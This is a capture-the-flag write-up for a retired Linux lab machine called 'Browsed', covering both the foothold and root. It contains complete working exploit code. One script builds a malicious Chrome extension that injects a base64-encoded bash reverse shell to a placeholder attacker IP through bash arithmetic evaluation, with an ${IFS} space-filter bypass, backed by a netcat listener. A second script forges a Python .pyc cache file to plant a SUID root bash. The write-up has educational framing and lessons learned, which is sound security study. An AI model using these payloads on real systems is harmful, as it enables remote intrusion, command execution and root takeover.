# Browsed

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square) ![Released](https://img.shields.io/badge/Released-2026--01--10-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Medium |
| **Release** | January 10, 2026 |
| **Rating** | 4.6 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

The public site accepts Chrome extension uploads and loads each one in a browser running with `--no-sandbox`. A Gitea instance on an internal vhost leaks the source of a Flask app bound to `127.0.0.1:5000`, whose `/routines/<name>` endpoint is command-injectable through bash arithmetic evaluation. A malicious Manifest V3 extension whose service worker fetches that localhost endpoint therefore reaches it from inside, giving a shell as `larry`. Root is Python bytecode cache poisoning: `/opt/extensiontool/__pycache__/` is world-writable, and a forged `.pyc` matching the source file's size and mtime is loaded without recompilation by a sudo-permitted script.

---

## Reconnaissance

### Initial Enumeration

Added host entry:
```bash
echo "<TARGET_IP> browsedinternals.htb" | sudo tee -a /etc/hosts
```

Discovered two web services:
- **Port 80 (direct IP):** Main "Browsed" website with extension upload feature at `/upload.php`
- **Port 80 (browsedinternals.htb):** Gitea instance hosting source code

### Key Discovery

The Gitea instance at `http://browsedinternals.htb/larry/MarkdownPreview/` contained the source code for a Flask application running internally on `127.0.0.1:5000`. The `/routines/<name>` endpoint was vulnerable to command injection via bash arithmetic evaluation `$()`.

---

## Initial Foothold - User Flag

### Attack Vector Analysis

The web application:
1. Accepts Chrome extension uploads in ZIP format
2. Loads and executes the extension in a Chrome browser running with `--no-sandbox`
3. The internal Flask app on localhost:5000 has a command injection vulnerability

### Exploit Development

Created a malicious Chrome Manifest V3 extension:

**exploit_extension.py:**
```python
import zipfile
import io
import base64

def create_shell_extension(my_ip, my_port="4332"):
    # Base64 encode the reverse shell
    raw_shell = f"bash -i >& /dev/tcp/{my_ip}/{my_port} 0>&1"
    b64_shell = base64.b64encode(raw_shell.encode()).decode()
    
    # Payload using IFS to bypass space filtering
    shell_payload = f"echo${{IFS}}{b64_shell}|base64${{IFS}}-d|bash"

    # Manifest V3 structure
    manifest = '''{
    "manifest_version": 3,
    "name": "Security Optimizer",
    "version": "1.1",
    "background": {
        "service_worker": "background.js"
    },
    "host_permissions": ["*://127.0.0.1/*", "*://localhost/*"]
}'''

    # background.js - triggers the command injection
    background = f'''const payload = "{shell_payload}";

async function triggerShell() {{
    const urls = [
        `http://127.0.0.1:5000/routines/a[$(${{payload}})]`
    ];

    for (const url of urls) {{
        fetch(url, {{ mode: 'no-cors' }});
    }}
}}

triggerShell();
'''

    with zipfile.ZipFile("shell_exploit.zip", 'w', zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.writestr("manifest.json", manifest)
        zip_file.writestr("background.js", background)

    print(f"[+] shell_exploit.zip created")
    print(f"[+] Listener: nc -lvnp {my_port}")

if __name__ == "__main__":
    create_shell_extension("<ATTACKER_IP>", "4332")
```

### Exploitation Steps

1. Generated the malicious extension:
```bash
python3 exploit_extension.py
```

2. Started netcat listener:
```bash
nc -lvnp 4332
```

3. Uploaded `shell_exploit.zip` to `http://<TARGET_IP>/upload.php`

4. Received reverse shell as `larry`:
```
Connection received on <TARGET_IP> 35584
larry@browsed:~/markdownPreview$
```

5. Retrieved user flag:
```bash
cat ~/user.txt
# [flag redacted]
```

---

## Privilege Escalation - Root Flag

### Enumeration

Discovered:
- `/opt/extensiontool/extension_tool.py` - can be run with sudo
- `/opt/extensiontool/__pycache__/` - **world-writable directory**
- The tool imports `extension_utils.py` which gets cached as `.pyc` bytecode

### Attack Vector: Python Bytecode Cache Poisoning

Python's bytecode caching mechanism validates `.pyc` files by checking:
1. Source file size
2. Source file modification timestamp

If both match, Python loads the cached bytecode **without recompiling** the source. By crafting a malicious `.pyc` file that matches the original source file's metadata, we can inject arbitrary code.

### Exploit Development

Created `/tmp/exploit.py`:
```python
import os
import py_compile
import shutil

ORIGINAL_SRC = "/opt/extensiontool/extension_utils.py"
MALICIOUS_SRC = "/tmp/extension_utils.py"
TARGET_PYC = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"

# Get original file stats
stat = os.stat(ORIGINAL_SRC)
target_size = stat.st_size

# Malicious payload - creates SUID bash
payload = 'import os\ndef validate_manifest(path): os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"); return {}\ndef clean_temp_files(arg): pass\n'

# Pad to match exact size of original file
padding_needed = target_size - len(payload)
payload += "#" * padding_needed

# Write malicious source file
with open(MALICIOUS_SRC, "w") as f:
    f.write(payload)

# Clone timestamps from original
os.utime(MALICIOUS_SRC, (stat.st_atime, stat.st_mtime))

# Compile to bytecode
py_compile.compile(MALICIOUS_SRC, cfile="/tmp/malicious.pyc")

# Inject into cache
if os.path.exists(TARGET_PYC):
    os.remove(TARGET_PYC)
shutil.copy("/tmp/malicious.pyc", TARGET_PYC)

print("[+] Poisoned .pyc injected successfully")
```

### Exploitation Steps

1. Created and ran the exploit:
```bash
python3.12 /tmp/exploit.py
# [+] Poisoned .pyc injected successfully
```

2. Triggered the poisoned bytecode via sudo:
```bash
sudo /opt/extensiontool/extension_tool.py --ext Fontify
```

3. Executed the SUID bash:
```bash
/tmp/rootbash -p
```

4. Retrieved root flag:
```bash
cat /root/root.txt
# [flag redacted]
```

---

## Key Techniques Used

| Phase | Technique | Description |
|-------|-----------|-------------|
| Recon | Source Code Review | Found vulnerable Flask app in Gitea |
| Foothold | Chrome Extension Abuse | Malicious Manifest V3 service worker |
| Foothold | Command Injection | Bash arithmetic evaluation `a[$(cmd)]` |
| Foothold | Filter Bypass | `${IFS}` for space character bypass |
| Privesc | Python Bytecode Poisoning | Forged `.pyc` with matching size/timestamp |
| Privesc | SUID Binary Creation | Created `/tmp/rootbash` with SUID bit |

---

## Lessons Learned

1. **Internal services are not safe** - Even localhost-only services can be exploited via browser extensions or SSRF
2. **Chrome extensions are powerful** - Service workers can make arbitrary requests to localhost
3. **Python caching is exploitable** - World-writable `__pycache__` directories allow bytecode injection
4. **Metadata matters** - Python's bytecode validation is weak (only size + timestamp)

---

## References

- Python PYC Abuse: https://matmul.net/$/pyc.html
- Chrome Manifest V3 Documentation
- Bash Arithmetic Evaluation Command Injection

---

## Timeline

| Time | Action |
|------|--------|
| 0:00 | Started enumeration |
| 0:05 | Discovered extension upload and Gitea |
| 0:10 | Created malicious extension |
| 0:12 | Got shell as larry |
| 0:15 | Identified pycache privesc vector |
| 0:18 | Rooted |

**Total Time: ~18 minutes**

---

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
